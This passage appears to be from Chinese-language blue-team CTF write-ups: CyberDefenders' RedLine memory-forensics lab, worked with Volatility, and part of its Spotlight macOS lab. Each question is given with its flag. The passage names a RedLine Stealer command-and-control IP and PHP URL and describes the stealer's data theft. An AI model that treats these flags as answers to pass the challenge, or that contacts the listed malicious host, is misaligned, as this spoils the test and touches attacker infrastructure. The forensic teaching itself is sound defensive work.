False 2023-05-21 22:36:03.000000 N/Disabled 6724 3580 Outline.exe 0xad818e578080 0 - 1 True 2023-05-21 22:36:09.000000 2023-05-21 23:01:24.000000 Disabled 4224 6724 Outline.exe 0xad818e88b080 0 - 1 True 2023-05-21 22:36:23.000000 2023-05-21 23:01:24.000000 Disabled 7160 824 SearchApp.exe 0xad818ccc4080 57 - 1 False 2023-05-21 22:39:13.000000 N/Disabled 4628 6724 tun2socks.exe 0xad818de82340 0 - 1 True 2023-05-21 22:40:10.000000 2023-05-21 23:01:24.000000 Disabled 6048 448 taskhostw.exe 0xad818dc5d080 5 - 1 False 2023-05-21 22:40:20.000000 N/Disabled 8264 824 RuntimeBroker. 0xad818eec8080 4 - 1 False 2023-05-21 22:40:33.000000 N/Disabled 3608 676 svchost.exe 0xad818d07a080 3 - 0 False 2023-05-21 22:41:28.000000 N/Disabled 6644 824 SkypeApp.exe 0xad818d3ac080 49 - 1 False 2023-05-21 22:41:52.000000 N/Disabled 5656 824 RuntimeBroker. 0xad81876e8080 0 - 1 False 2023-05-21 21:58:19.000000 2023-05-21 22:02:01.000000 Disabled 8952 824 TextInputHost. 0xad818e6db080 10 - 1 False 2023-05-21 21:59:11.000000 N/Disabled 5808 824 HxTsr.exe 0xad818de5d080 0 - 1 False 2023-05-21 21:59:58.000000 2023-05-21 22:07:45.000000 Disabled 2388 5328 msedge.exe 0xad818e54c340 18 - 1 False 2023-05-21 22:05:35.000000 N/Disabled 6292 5328 msedge.exe 0xad818d7a1080 20 - 1 False 2023-05-21 22:06:15.000000 N/Disabled 3876 448 taskhostw.exe 0xad8189b30080 8 - 1 False 2023-05-21 22:08:02.000000 N/Disabled 372 824 SkypeBackgroun 0xad8186f49080 3 - 1 False 2023-05-21 22:10:00.000000 N/Disabled 1120 676 MsMpEng.exe 0xad818945c080 12 - 0 False 2023-05-21 22:10:01.000000 N/Disabled 6076 824 ShellExperienc 0xad818eb18080 14 - 1 False 2023-05-21 22:11:36.000000 N/Disabled 7336 824 RuntimeBroker. 0xad818e8bb080 2 - 1 False 2023-05-21 22:11:39.000000 N/Disabled 7964 5328 msedge.exe 0xad818dee5080 19 - 1 False 2023-05-21 22:22:09.000000 N/Disabled 6544 5328 msedge.exe 0xad818c0ea080 18 - 1 False 2023-05-21 22:22:35.000000 N/Disabled 5964 676 svchost.exe 0xad818ef86080 5 - 0 False 2023-05-21 22:27:56.000000 N/Disabled 8896 5328 msedge.exe 0xad8187a39080 18 - 1 False 2023-05-21 22:28:21.000000 N/Disabled 5156 5328 msedge.exe 0xad818c553080 14 - 1 False 2023-05-21 22:28:22.000000 N/Disabled 5896 8844 oneetx.exe 0xad8189b41080 5 - 1 True 2023-05-21 22:30:56.000000 N/Disabled 7732 5896 rundll32.exe 0xad818d1912c0 1 - 1 True 2023-05-21 22:31:53.000000 N/Disabled 6324 1496 audiodg.exe 0xad818df2e080 4 - 0 False 2023-05-21 22:42:56.000000 N/Disabled 2228 3580 FTK Imager.exe 0xad818d143080 10 - 1 False 2023-05-21 22:43:56.000000 N/Disabled 5636 3580 notepad.exe 0xad818db45080 1 - 1 False 2023-05-21 22:46:50.000000 N/Disabled 2044 676 svchost.exe 0xad8189b27080 28 - 0 False 2023-05-21 22:49:29.000000 N/Disabled 8708 676 svchost.exe 0xad818d431080 5 - 0 False 2023-05-21 22:57:33.000000 N/Disabled 5476 676 svchost.exe 0xad818e752080 9 - 0 False 2023-05-21 22:58:08.000000 N/Disabled 6596 676 TrustedInstall 0xad818dc88080 4 - 0 False 2023-05-21 22:58:13.000000 N/Disabled 2332 824 TiWorker.exe 0xad818e780080 4 - 0 False 2023-05-21 22:58:13.000000 N/Disabled 4340 676 VSSVC.exe 0xad818e888080 3 - 0 False 2023-05-21 23:01:06.000000 N/Disabled 7540 824 smartscreen.ex 0xad818e893080 14 - 1 False 2023-05-21 23:02:26.000000 N/Disabled 8920 3580 FTK Imager.exe 0xad818ef81080 20 - 1 False 2023-05-21 23:02:28.000000 N/Disabled 5480 448 oneetx.exe 0xad818d3d6080 6 - 1 True 2023-05-21 23:03:00.000000 N/Disabled ::: 方法二: 用malfind排出一些正常的process $ python vol.py -f MemoryDump.mem windows.malfind Volatility 3 Framework 2.4.2 Progress: 100.00 PDB scanning finished PID Process Start VPN End VPN Tag Protection CommitCharge PrivateMemory File output Hexdump Disasm 5896 oneetx.exe 0x400000 0x437fff VadS PAGE_EXECUTE_READWRITE 56 1 Disabled 4d 5a 90 00 03 00 00 00 MZ...... 04 00 00 00 ff ff 00 00 ........ b8 00 00 00 00 00 00 00 ........ 40 00 00 00 00 00 00 00 @....... 00 00 00 00 00 00 00 00 ........ 00 00 00 00 00 00 00 00 ........ 00 00 00 00 00 00 00 00 ........ 00 00 00 00 00 01 00 00 ........ 0x400000: dec ebp 0x400001: pop edx 0x400002: nop 0x400003: add byte ptr [ebx], al 0x400005: add byte ptr [eax], al 0x400007: add byte ptr [eax + eax], al 0x40000a: add byte ptr [eax], al 7540 smartscreen.ex 0x2505c140000 0x2505c15ffff VadS PAGE_EXECUTE_READWRITE 1 1 Disabled 48 89 54 24 10 48 89 4c H.T$.H.L 24 08 4c 89 44 24 18 4c $.L.D$.L 89 4c 24 20 48 8b 41 28 .L$.H.A( 48 8b 48 08 48 8b 51 50 H.H.H.QP 48 83 e2 f8 48 8b ca 48 H...H..H b8 60 00 14 5c 50 02 00 .`..\\P.. 00 48 2b c8 48 81 f9 70 .H+.H..p 0f 00 00 76 09 48 c7 c1 ...v.H.. 0x2505c140000: mov qword ptr [rsp + 0x10], rdx 0x2505c140005: mov qword ptr [rsp + 8], rcx 0x2505c14000a: mov qword ptr [rsp + 0x18], r8 0x2505c14000f: mov qword ptr [rsp + 0x20], r9 0x2505c140014: mov rax, qword ptr [rcx + 0x28] 0x2505c140018: mov rcx, qword ptr [rax + 8] 0x2505c14001c: mov rdx, qword ptr [rcx + 0x50] 0x2505c140020: and rdx, 0xfffffffffffffff8 0x2505c140024: mov rcx, rdx 0x2505c140027: movabs rax, 0x2505c140060 0x2505c140031: sub rcx, rax 0x2505c140034: cmp rcx, 0xf70 0x2505c14003b: jbe 0x2505c140046 可以看到oneetx.exe和smartscreen.ex都有進行一些可疑操作，果然oneetx.exe就是答案 :::spoiler Flag Flag: oneetx.exe :::\n==Q2== # What is the child process name of the suspicious process?\nRecon # 透過上一題的結果可以知道PID 5896的oneetx.exe創造了rundll32.exe，所以rundll32.exe就是oneetx.exe的子程序\nExploit # :::spoiler Flag Flag: rundll32.exe :::\n==Q3== # What is the memory protection applied to the suspicious process memory region?\nRecon # 這一題因為不知道他到底在問甚麼，所以是參考1的說明，主要可以從Q1的結果看他的protection，這應該就有點像是unix的權限ㄅ\nExploit # :::spoiler Flag Flag: PAGE_EXECUTE_READWRITE :::\n==Q4== # What is the name of the process responsible for the VPN connection?\nRecon # 這一題也是從上上一題的結果慢慢try出來的，不過如果此細看有一些process也是常見的東西\n什麼是svchost.exe？ svchost.exe被稱為服務主機，是一個軟體程式，是Windows操作系統的一部分，被許多Windows應用程式使用。一台計算機的svchost.exe應該位於系統文件夾中的\u0026rsquo;\\windows\\System32\u0026rsquo;。 在啟動時，服務控制管理器啟動svchost.exe，以管理從動態鏈接庫（DLLs）運行的系統服務。因此，對於每個正在運行的服務，都有一個svchost.exe的實例來管理它。 它通過確保各種服務和進程共享資源來幫助減少CPU負荷。動態鏈接庫有被各種軟體應用程式所利用的代碼。它們需要svchost.exe作為額外的軟體來確保運行這些不同服務的效率。這可以確保Windows或其他程式所需的DLL文件被有效加載。\ndllhost.exe dllhost.exe是微軟Windows操作系統的一部分。dllhost.exe用於管理DLL應用，在任務管理器中可以找到，這個程序對是微軟Windows系統的正常運行是非常重要的。\nExploit # Outline\nOutline 可讓任何人建立和執行自己專屬的 VPN，以及分享 VPN 的存取權。由於經過特殊設計，Outline 可防禦封鎖機制，並讓你控制自己的伺服器設定，包含伺服器的所在位置。Outline 採用公開透明的技術及完整開放原始碼，而且經過兩家安全性機構的稽核，確保這款軟體採用最新技術且安全無虞。\n:::spoiler Flag Flag: Outline.exe :::\n==Q5== # What is the attacker\u0026rsquo;s IP address?\nRecon # 直覺就是netscan\nExploit # :::spoiler Command Result\n$ python vol.py -f MemoryDump.mem windows.netscan Volatility 3 Framework 2.4.2 Progress: 100.00 PDB scanning finished Offset Proto LocalAddr LocalPort ForeignAddr ForeignPort State PID Owner Created 0xad81861e2310 TCPv4 0.0.0.0 49668 0.0.0.0 0 LISTENING 1840 spoolsv.exe 2023-05-21 22:28:09.000000 0xad81861e2310 TCPv6 :: 49668 :: 0 LISTENING 1840 spoolsv.exe 2023-05-21 22:28:09.000000 0xad81861e2470 TCPv4 0.0.0.0 5040 0.0.0.0 0 LISTENING 1196 svchost.exe 2023-05-21 22:30:31.000000 0xad81861e2730 TCPv4 0.0.0.0 135 0.0.0.0 0 LISTENING 952 svchost.exe 2023-05-21 22:27:36.000000 0xad81861e2b50 TCPv4 0.0.0.0 49665 0.0.0.0 0 LISTENING 552 wininit.exe 2023-05-21 22:27:36.000000 0xad81861e2b50 TCPv6 :: 49665 :: 0 LISTENING 552 wininit.exe 2023-05-21 22:27:36.000000 0xad81861e2e10 TCPv4 0.0.0.0 49665 0.0.0.0 0 LISTENING 552 wininit.exe 2023-05-21 22:27:36.000000 0xad81861e3230 TCPv4 0.0.0.0 49664 0.0.0.0 0 LISTENING 696 lsass.exe 2023-05-21 22:27:36.000000 0xad81861e3390 TCPv4 0.0.0.0 135 0.0.0.0 0 LISTENING 952 svchost.exe 2023-05-21 22:27:36.000000 0xad81861e3390 TCPv6 :: 135 :: 0 LISTENING 952 svchost.exe 2023-05-21 22:27:36.000000 0xad81861e34f0 TCPv4 0.0.0.0 49664 0.0.0.0 0 LISTENING 696 lsass.exe 2023-05-21 22:27:36.000000 0xad81861e34f0 TCPv6 :: 49664 :: 0 LISTENING 696 lsass.exe 2023-05-21 22:27:36.000000 0xad81861e37b0 TCPv4 0.0.0.0 49666 0.0.0.0 0 LISTENING 1012 svchost.exe 2023-05-21 22:27:49.000000 0xad81861e37b0 TCPv6 :: 49666 :: 0 LISTENING 1012 svchost.exe 2023-05-21 22:27:49.000000 0xad81861e3910 TCPv4 0.0.0.0 49667 0.0.0.0 0 LISTENING 448 svchost.exe 2023-05-21 22:27:58.000000 0xad81861e3910 TCPv6 :: 49667 :: 0 LISTENING 448 svchost.exe 2023-05-21 22:27:58.000000 0xad81861e3a70 TCPv4 0.0.0.0 49668 0.0.0.0 0 LISTENING 1840 spoolsv.exe 2023-05-21 22:28:09.000000 0xad81861e3bd0 TCPv4 0.0.0.0 49666 0.0.0.0 0 LISTENING 1012 svchost.exe 2023-05-21 22:27:49.000000 0xad81861e3e90 TCPv4 0.0.0.0 49667 0.0.0.0 0 LISTENING 448 svchost.exe 2023-05-21 22:27:58.000000 0xad818662ecb0 TCPv4 0.0.0.0 445 0.0.0.0 0 LISTENING 4 System 2023-05-21 22:29:04.000000 0xad818662ecb0 TCPv6 :: 445 :: 0 LISTENING 4 System 2023-05-21 22:29:04.000000 0xad818662f390 TCPv4 0.0.0.0 7680 0.0.0.0 0 LISTENING 5476 svchost.exe 2023-05-21 22:58:09.000000 0xad818662f390 TCPv6 :: 7680 :: 0 LISTENING 5476 svchost.exe 2023-05-21 22:58:09.000000 0xad81878518f0 UDPv4 192.168.190.141 138 * 0 4 System 2023-05-21 22:27:56.000000 0xad8187852250 UDPv4 192.168.190.141 137 * 0 4 System 2023-05-21 22:27:56.000000 0xad818902a5d0 TCPv4 192.168.190.141 139 0.0.0.0 0 LISTENING 4 System 2023-05-21 22:27:56.000000 0xad818971f870 UDPv4 0.0.0.0 56250 * 0 6644 SkypeApp.exe 2023-05-21 22:58:07.000000 0xad818971f870 UDPv6 :: 56250 * 0 6644 SkypeApp.exe 2023-05-21 22:58:07.000000 0xad81897eb010 TCPv4 10.0.85.2 55439 20.22.207.36 443 CLOSED 448 svchost.exe 2023-05-21 23:00:40.000000 0xad81898a6d10 UDPv4 127.0.0.1 57787 * 0 448 svchost.exe 2023-05-21 22:28:54.000000 0xad81898bc7f0 UDPv4 0.0.0.0 5355 * 0 1448 svchost.exe 2023-05-21 22:57:37.000000 0xad81898bc7f0 UDPv6 :: 5355 * 0 1448 svchost.exe 2023-05-21 22:57:37.000000 0xad8189a291b0 TCPv4 0.0.0.0 55972 0.0.0.0 0 LISTENING 5964 svchost.exe 2023-05-21 22:27:57.000000 0xad8189a291b0 TCPv6 :: 55972 :: 0 LISTENING 5964 svchost.exe 2023-05-21 22:27:57.000000 0xad8189a29470 TCPv4 0.0.0.0 55972 0.0.0.0 0 LISTENING 5964 svchost.exe 2023-05-21 22:27:57.000000 0xad8189a2a7b0 TCPv4 0.0.0.0 49669 0.0.0.0 0 LISTENING 676 services.exe 2023-05-21 22:29:08.000000 0xad8189a2a910 TCPv4 0.0.0.0 49669 0.0.0.0 0 LISTENING 676 services.exe 2023-05-21 22:29:08.000000 0xad8189a2a910 TCPv6 :: 49669 :: 0 LISTENING 676 services.exe 2023-05-21 22:29:08.000000 0xad8189a30a20 TCPv4 192.168.190.141 53660 38.121.43.65 443 CLOSED 4628 tun2socks.exe 2023-05-21 22:00:25.000000 0xad8189a844e0 UDPv4 10.0.85.2 58844 * 0 5328 msedge.exe 2023-05-21 22:51:53.000000 0xad8189cea350 UDPv4 0.0.0.0 5050 * 0 1196 svchost.exe 2023-05-21 22:30:27.000000 0xad818c17ada0 UDPv4 0.0.0.0 52051 * 0 4628 tun2socks.exe 2023-05-21 22:24:14.000000 0xad818c367b30 TCPv4 192.168.190.141 49710 204.79.197.203 443 CLOSE_WAIT 1916 SearchApp.exe 2023-05-21 22:33:09.000000 0xad818c3b22e0 UDPv4 0.0.0.0 63218 * 0 1448 svchost.exe 2023-05-21 22:39:15.000000 0xad818c3b22e0 UDPv6 :: 63218 * 0 1448 svchost.exe 2023-05-21 22:39:15.000000 0xad818d004ba0 UDPv4 0.0.0.0 63917 * 0 1448 svchost.exe 2023-05-21 23:02:48.000000 0xad818d004ba0 UDPv6 :: 63917 * 0 1448 svchost.exe 2023-05-21 23:02:48.000000 0xad818d1bc010 TCPv4 10.0.85.2 55424 52.182.143.208 443 CLOSE_WAIT 6644 SkypeApp.exe 2023-05-21 22:57:59.000000 0xad818d2f7b00 TCPv4 10.0.85.2 55460 52.159.127.243 443 CLOSED 448 svchost.exe 2023-05-21 23:01:08.000000 0xad818d5352b0 TCPv4 10.0.85.2 53659 204.79.197.237 443 CLOSED 3580 explorer.exe 2023-05-21 22:00:25.000000 0xad818da19700 UDPv4 0.0.0.0 500 * 0 448 svchost.exe 2023-05-21 22:27:56.000000 0xad818da1ab50 UDPv4 0.0.0.0 4500 * 0 448 svchost.exe 2023-05-21 22:27:56.000000 0xad818da1d8a0 UDPv4 0.0.0.0 4500 * 0 448 svchost.exe 2023-05-21 22:27:56.000000 0xad818da1d8a0 UDPv6 :: 4500 * 0 448 svchost.exe 2023-05-21 22:27:56.000000 0xad818da1dbc0 UDPv4 0.0.0.0 0 * 0 448 svchost.exe 2023-05-21 22:27:57.000000 0xad818da1dbc0 UDPv6 :: 0 * 0 448 svchost.exe 2023-05-21 22:27:57.000000 0xad818da1e520 UDPv4 0.0.0.0 0 * 0 448 svchost.exe 2023-05-21 22:27:57.000000 0xad818da1f010 UDPv4 0.0.0.0 500 * 0 448 svchost.exe 2023-05-21 22:27:56.000000 0xad818da1f010 UDPv6 :: 500 * 0 448 svchost.exe 2023-05-21 22:27:56.000000 0xad818da202d0 UDPv4 0.0.0.0 0 * 0 5964 svchost.exe 2023-05-21 22:27:57.000000 0xad818da202d0 UDPv6 :: 0 * 0 5964 svchost.exe 2023-05-21 22:27:57.000000 0xad818da21bd0 UDPv4 0.0.0.0 0 * 0 5964 svchost.exe 2023-05-21 22:27:57.000000 0xad818dbc1a60 TCPv4 192.168.190.141 49713 104.119.188.96 443 CLOSE_WAIT 1916 SearchApp.exe 2023-05-21 22:33:11.000000 0xad818dd05370 UDPv4 0.0.0.0 5353 * 0 5328 msedge.exe 2023-05-21 23:01:32.000000 0xad818dd07440 UDPv4 0.0.0.0 5353 * 0 5328 msedge.exe 2023-05-21 23:01:32.000000 0xad818dd07440 UDPv6 :: 5353 * 0 5328 msedge.exe 2023-05-21 23:01:32.000000 0xad818de4aa20 TCPv4 10.0.85.2 55462 77.91.124.20 80 CLOSED 5896 oneetx.exe 2023-05-21 23:01:22.000000 0xad818df1d920 TCPv4 192.168.190.141 55433 38.121.43.65 443 CLOSED 4628 tun2socks.exe 2023-05-21 23:00:02.000000 0xad818e3698f0 UDPv4 0.0.0.0 5353 * 0 5328 msedge.exe 2023-05-21 22:05:24.000000 0xad818e3701a0 UDPv4 0.0.0.0 5353 * 0 5328 msedge.exe 2023-05-21 22:05:24.000000 0xad818e3701a0 UDPv6 :: 5353 * 0 5328 msedge.exe 2023-05-21 22:05:24.000000 0xad818e370b00 UDPv4 0.0.0.0 5353 * 0 5328 msedge.exe 2023-05-21 22:05:24.000000 0xad818e371dc0 UDPv4 0.0.0.0 5353 * 0 5328 msedge.exe 2023-05-21 22:05:24.000000 0xad818e371dc0 UDPv6 :: 5353 * 0 5328 msedge.exe 2023-05-21 22:05:24.000000 0xad818e3a1200 UDPv4 0.0.0.0 5355 * 0 1448 svchost.exe 2023-05-21 22:57:37.000000 0xad818e4a6900 UDPv4 0.0.0.0 0 * 0 5480 oneetx.exe 2023-05-21 22:39:47.000000 0xad818e4a6900 UDPv6 :: 0 * 0 5480 oneetx.exe 2023-05-21 22:39:47.000000 0xad818e4a9650 UDPv4 0.0.0.0 0 * 0 5480 oneetx.exe 2023-05-21 22:39:47.000000 0xad818e77da20 TCPv4 192.168.190.141 52434 204.79.197.200 443 CLOSED - - 2023-05-21 23:02:20.000000 0xad818ef06c70 UDPv6 fe80::a406:8c42:43a9:413 1900 * 0 3004 svchost.exe 2023-05-21 22:40:16.000000 0xad818ef09b50 UDPv6 fe80::4577:874:81a:78cd 1900 * 0 3004 svchost.exe 2023-05-21 22:40:16.000000 0xad818ef0b5e0 UDPv6 ::1 1900 * 0 3004 svchost.exe 2023-05-21 22:40:16.000000 0xad818ef0ec90 UDPv6 fe80::a406:8c42:43a9:413 55910 * 0 3004 svchost.exe 2023-05-21 22:40:16.000000 0xad818ef0f140 UDPv6 fe80::4577:874:81a:78cd 55911 * 0 3004 svchost.exe 2023-05-21 22:40:16.000000 0xad818ef0f2d0 UDPv6 ::1 55912 * 0 3004 svchost.exe 2023-05-21 22:40:16.000000 0xad818ef0fdc0 UDPv4 192.168.190.141 55913 * 0 3004 svchost.exe 2023-05-21 22:40:16.000000 0xad818ef10270 UDPv4 10.0.85.2 137 * 0 4 System 2023-05-21 22:40:16.000000 0xad818ef11530 UDPv4 192.168.190.141 1900 * 0 3004 svchost.exe 2023-05-21 22:40:16.000000 0xad818ef116c0 UDPv4 10.0.85.2 1900 * 0 3004 svchost.exe 2023-05-21 22:40:16.000000 0xad818ef11850 UDPv4 10.0.85.2 138 * 0 4 System 2023-05-21 22:40:16.000000 0xad818ef119e0 UDPv4 127.0.0.1 1900 * 0 3004 svchost.exe 2023-05-21 22:40:16.000000 0xad818ef13150 UDPv4 10.0.85.2 55914 * 0 3004 svchost.exe 2023-05-21 22:40:16.000000 0xad818ef132e0 UDPv4 127.0.0.1 55915 * 0 3004 svchost.exe 2023-05-21 22:40:16.000000 0xad818ef77b40 TCPv4 192.168.190.141 55176 192.168.190.2 53 CLOSED 1448 svchost.exe 2023-05-21 23:01:39.000000 0xad818f88cc80 UDPv4 0.0.0.0 5355 * 0 1448 svchost.exe 2023-05-21 23:01:26.000000 0xad818f88cc80 UDPv6 :: 5355 * 0 1448 svchost.exe 2023-05-21 23:01:26.000000 0xad818f894340 UDPv4 0.0.0.0 5355 * 0 1448 svchost.exe 2023-05-21 23:01:26.000000 0xad8190dd8800 UDPv4 0.0.0.0 5353 * 0 1448 svchost.exe 2023-05-21 23:01:25.000000 0xad8190dd8800 UDPv6 :: 5353 * 0 1448 svchost.exe 2023-05-21 23:01:25.000000 0xad8190dd8990 UDPv4 0.0.0.0 5353 * 0 1448 svchost.exe 2023-05-21 23:01:25.000000 0xad8190dd97a0 UDPv4 0.0.0.0 0 * 0 1448 svchost.exe 2023-05-21 23:01:25.000000 0xad8190dd97a0 UDPv6 :: 0 * 0 1448 svchost.exe 2023-05-21 23:01:25.000000 0xad8190e12b10 UDPv6 fe80::a406:8c42:43a9:413 1900 * 0 3004 svchost.exe 2023-05-21 23:01:29.000000 0xad8190e161c0 UDPv6 ::1 1900 * 0 3004 svchost.exe 2023-05-21 23:01:29.000000 0xad8190e16e40 UDPv4 192.168.190.141 1900 * 0 3004 svchost.exe 2023-05-21 23:01:29.000000 0xad8190e19230 UDPv6 ::1 57094 * 0 3004 svchost.exe 2023-05-21 23:01:29.000000 0xad8190e1a1d0 UDPv4 192.168.190.141 57095 * 0 3004 svchost.exe 2023-05-21 23:01:29.000000 0xad8190e1a360 UDPv4 127.0.0.1 57096 * 0 3004 svchost.exe 2023-05-21 23:01:29.000000 0xad8190e1a680 UDPv4 127.0.0.1 1900 * 0 3004 svchost.exe 2023-05-21 23:01:29.000000 0xad8190e1acc0 UDPv6 fe80::a406:8c42:43a9:413 57093 * 0 3004 svchost.exe 2023-05-21 23:01:29.000000 0xad8190e59a60 UDPv4 0.0.0.0 55536 * 0 4628 tun2socks.exe 2023-05-21 23:00:47.000000 0xad8190e59d80 UDPv4 0.0.0.0 56228 * 0 4628 tun2socks.exe 2023-05-21 23:00:38.000000 0xad8190e5b040 UDPv4 0.0.0.0 49734 * 0 4628 tun2socks.exe 2023-05-21 23:00:41.000000 ::: 直接看oneetx.exe的PID就可以看到了\n:::spoiler Flag Flag: 77.91.124.20 :::\n==Q6== # Based on the previous artifacts. What is the name of the malware family?\nRecon # 這題也找了超久，1是直接用string search看有沒有readline stealer的字樣，但也沒說key words哪來的，所以就直接先送flag後看官解\nExploit # 因為這是一隻真正的trojan樣本，所以可以從上一題看到他傳送資訊給C2C server的IP，而我們可以把該IP透過virustotal查看 從community中，最下面有一個RedLine的討論 該文章說明RedLine Stealer是一隻怎樣的惡意程式 RedLine Stealer is a malware available on underground forums for sale apparently as standalone ($100/$150 depending on the version) or also on a subscription basis ($100/month). This malware harvests information from browsers such as saved credentials, autocomplete data, and credit card information. A system inventory is also taken when running on a target machine, to include details such as the username, location data, hardware configuration, and information regarding installed security software. More recent versions of RedLine added the ability to steal cryptocurrency. FTP and IM clients are also apparently targeted by this family, and this malware has the ability to upload and download files, execute commands, and periodically send back information about the infected computer.\n:::spoiler Flag Flag: Redline Stealer :::\n==Q7== # What is the full URL of the PHP file that the attacker visited?\nRecon # 這一題也不到怎麼用正規的方式知道他訪問了哪些頁面，所以也是參考1的解法才知道可以用string search\nExploit # 從前面可以知道C\u0026amp;C server IP是77.91.124.20，則我們可以知道他應該是request這個IP所建立的網站\n$ strings MemoryDump.mem | grep \u0026#34;http://77.91.124.20\u0026#34; http://77.91.124.20/ E http://77.91.124.20/store/gamel http://77.91.124.20/ E http://77.91.124.20/DSC01491/ http://77.91.124.20/DSC01491/ http://77.91.124.20/store/games/index.php http://77.91.124.20/store/games/index.php http://77.91.124.20/store/games/index.php :::spoiler Flag Flag: http://77.91.124.20/store/games/index.php :::\n==Q8== # What is the full path of the malicious executable?\nRecon # 最後一題也超簡單，直接看filescan搭配findstr把有關oneetx.exe的string print出來後就知道位置在哪裡\nExploit # $ python vol.py -f MemoryDump.mem windows.filescan | findstr oneetx.exe 0xad818d436c70.0\\Users\\Tammam\\AppData\\Local\\Temp\\c3912af058\\oneetx.exe 216 0xad818da36c30 \\Users\\Tammam\\AppData\\Local\\Temp\\c3912af058\\oneetx.exe 216 0xad818ef1a0b0 \\Users\\Tammam\\AppData\\Local\\Temp\\c3912af058\\oneetx.exe 216 :::spoiler Flag Flag: C:\\Users\\Tammam\\AppData\\Local\\Temp\\c3912af058\\oneetx.exe :::\nReference # CyberDefenders Challenges: RedLine Walkthrough\u0026#160;\u0026#x21a9;\u0026#xfe0e;\u0026#160;\u0026#x21a9;\u0026#xfe0e;\u0026#160;\u0026#x21a9;\u0026#xfe0e;\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":88,"href":"/security/practice/cyberdefender/endpoint-forensic/cyberdefender---spotlight/","title":"CyberDefender - Spotlight","section":"Securities","content":" CyberDefender - Spotlight # Challenge: https://cyberdefenders.org/blueteam-ctf-challenges/34#nav-questions\n:::spoiler TOC [TOC] :::\nTools: # Autopsy mac_apt SQLite steghide :::info 因為這一個lab是有關Mac-OS的forensics，也沒有相關的背景知識，所以解出來的部分大多參考12，就是當作第一次學習的課題 :::\n==Q1== # What version of macOS is running on this image?\nRecon # 這個是參考1\nExploit # 在./root/System/Library/CoreServices/中可以找到SystemVersion.plist :::spoiler Flag Flag: 10.15 :::\n==Q2== # What \u0026ldquo;competitive advantage\u0026rdquo; did Hansel lie about in the file AnotherExample.jpg? (two words)\nExploit # 直接翻一下AnotherExample.jpg所在的資料夾，就可以發現有一個secret的text檔案，裡面就有這題的flag，不太知道和這張圖片有甚麼關係 :::info 11/13更新: 直接strings search這張圖片也可以找到secret strings的東西 :::\n:::spoiler Flag Flag: flip phone :::\n==Q3== # How many bookmarks are registered in safari?\nRecon # 這個是參考1\nExploit # 首先可以在./root/Users/hansel.apricot/Library/Safari的地方找到Bookmarks.plist，只要利用plistutil轉換成一般的xml格式就可以了\n$ plistutil -i Bookmarks.plist | grep \u0026#34;URLString\u0026#34; | wc -l 13 :::spoiler Flag Flag: 13 :::\n==Q4== # What\u0026rsquo;s the content of the note titled \u0026ldquo;Passwords\u0026rdquo;?\nRecon # 這一題是參考2，mac會把使用者的Note放在./root/Users/hansel.apricot/Library/Group Containers/group.com.apple.notes中的==NoteStore.sqlite==\nExploit # 可以看到Title是Passwords但沒有內容，依照2的說明，他是覺得答案應該是視title為content的一部份 :::spoiler Flag Flag: Passwords :::\n==Q5== # Provide the MAC address of the ethernet adapter for this machine.\nRecon # 這一題是參考2，就是直接grep search ==en0==\nExploit # 可以發現root/private/var/log/daily.out有符合\n$ grep -i -r \u0026#34;en0\u0026#34; grep: root/.fseventsd/00000000007f0fb2: binary file matches root/private/var/log/daily.out:en0 1500 \u0026lt;Link#4\u0026gt; 00:0c:29:c4:65:77 372733 0 73025 0 0 root/private/var/log/daily.out:en0 1500 fe80::8c8:8 fe80:4::8c8:87c2: 372733 - 73025 - - root/private/var/log/daily.out:en0 1500 184.171.151/2 stu-181-151-171 372733 - 73025 - - root/private/var/log/daily.out:en0 1500 \u0026lt;Link#4\u0026gt; 00:0c:29:c4:65:77 790 0 694 0 0 root/private/var/log/daily.out:en0 1500 fe80::1cba: fe80:4::1cba:cac8 790 - 694 - - root/private/var/log/daily.out:en0 1500 184.171.151/2 stu-181-151-171 790 - 694 - - grep: root/private/var/log/DiagnosticMessages/2020.04.19.asl: binary file matches grep: root/Users/hansel.apricot/Library/Safari/CloudAutoFillCorrections.db: binary file matches grep: root/Users/sneaky/.Trash/silenteye-0.4.1b-snowleopard.dmg: binary file matches :::spoiler Flag Flag: 00:0c:29:c4:65:77 :::\n==Q6== # Name the data URL of the quarantined item.\nRecon # 這一題是參考2\nQuarantined Events are a log of all downloaded items on MacOS.\nExploit # 主要macOS會把==com.apple.LaunchServices.QuarantineEventsV2==放在./root/Users/sneaky/Library/Preferences/，目前只有一個quarantined目標\n:::spoiler Flag Flag: https://futureboy.us/stegano/encode.pl :::\n==Q7== # What app did the user \u0026ldquo;sneaky\u0026rdquo; try to install via a .dmg file? (one word)\nExploit # 我是直接翻./root/Users/sneaky/.Trash就直接看到了 :::spoiler Flag Flag: silenteye :::\n==Q8== # What was the file \u0026lsquo;Examplesteg.jpg\u0026rsquo; renamed to?\nRecon # 這一題是參考2，必須使用mac_apt這套工具中的==FSEVENTS==幫忙parse .fseventsd中所有的event logs files\nFSEVENTS: Reads file system event logs (from .fseventsd)\nExploit # $ ./mac_apt_artifact_only.exe -i .fseventsd -o ./ FSEVENTS Output path was : ./ MAIN-INFO-Started macOS Artifact Parsing Tool - Artifact Only mode, version 1.5.8.dev (20230617) MAIN-INFO-Dates and times are in UTC unless the specific artifact being parsed saves it as local time! MAIN-INFO--------------------------------------------------- MAIN-INFO-Running plugin FSEVENTS MAIN-INFO--------------------------------------------------- MAIN.FSEVENTS-INFO-Module Started as standalone MAIN.FSEVENTS-INFO-Writing 231662 fsevent(s) MAIN.FSEVENTS-INFO-The source_date field on the fsevents are from the individual file modified date (metadata not data)! This may have changed if you are not on a live or read-only image. MAIN.FSEVENTS-INFO-231662 logs found MAIN-INFO--------------------------------------------------- MAIN-INFO-Finished in time = 00:00:04 MAIN-INFO-Review the Log file and report any ERRORs or EXCEPTIONS to the developers command結束會吐一個db file和一個log file，分析db file後就直接filter Examplesteg.jpg這張圖片 此時我們可以複製該file的ID，再接續filter File ID: 12885043806 :::spoiler Flag Flag: GoodExample.jpg :::\n==Q9== # How much time was spent on mail.zoho.com on 4/20/2020?\nRecon # 這一題是參考2，有關於screentime這個資訊會放在./root/private/var/folders/bf/r04p_gb17xxg37r9ksq855mh0000gn/0/com.apple.ScreenTimeAgent/Store/的==RMAdminStore-Local.sqlite== db file中，也是一樣透過mac_apt幫忙parse(SCREENTIME) :::info 記得要把RMAdminStore-Local.sqlite-wal和RMAdminStore-Local.sqlite這個檔案放在一起再執行 :::\nExploit # $ ls RMAdminStore-Local.sqlite-shm mac_apt_artifact_only.exe RMAdminStore-Local.sqlite RMAdminStore-Local.sqlite-wal mac_apt.exe mac_apt_mounted_sys_data.exe $ 